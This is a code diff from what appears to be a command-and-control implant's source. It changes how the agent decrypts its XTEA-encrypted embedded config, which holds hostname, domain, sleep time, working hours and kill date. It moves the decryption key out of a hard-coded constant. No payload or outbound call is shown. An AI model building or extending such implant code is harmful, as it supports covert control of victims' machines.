@@ -53,6 +53,8 @@ namespace Core {
         OSVERSIONINFOW OSVersionW   = { };
 
         CreateParser(&Parser, Strings, sizeof(Strings));
+        ParserMemcpy(&Parser, &Ctx->Config.Key);
+
         x_memset(Strings, 0, sizeof(Strings));
 
         if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
@@ -254,19 +256,17 @@ namespace Core {
         HEXANE
         Ctx->LE = TRUE;
 
-        PARSER Parser       = { };
-        BYTE InitKey[16]    = { OBF_KEY };
+        PARSER Parser = { };
 
+        __debugbreak();
         CreateParser(&Parser, Config, sizeof(Config));
         x_memset(Config, 0, sizeof(Config));
 
-        __debugbreak();
-        XteaCrypt(B_PTR(Parser.Handle), Parser.Length, InitKey, FALSE);
+        XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->Config.Key, FALSE);
 
-        ParserMemcpy(&Parser, &Ctx->Config.Key);
+        // get rid of key in the config, place it in strings
         ParserStrcpy(&Parser, &Ctx->Config.Hostname);
         ParserStrcpy(&Parser, &Ctx->Config.Domain);
-        ParserWcscpy(&Parser, &Ctx->Config.IngressPipename);
 
         Ctx->Session.PeerId = UnpackDword(&Parser);
         Ctx->Config.Sleeptime = UnpackDword(&Parser);
@@ -274,7 +274,6 @@ namespace Core {
         Ctx->Config.WorkingHours = UnpackDword(&Parser);
         Ctx->Config.Killdate = UnpackDword64(&Parser);
 
-        Ctx->Config.IngressPipename = nullptr;
         Ctx->Transport.OutboundQueue = nullptr;
 
 #ifdef TRANSPORT_HTTP
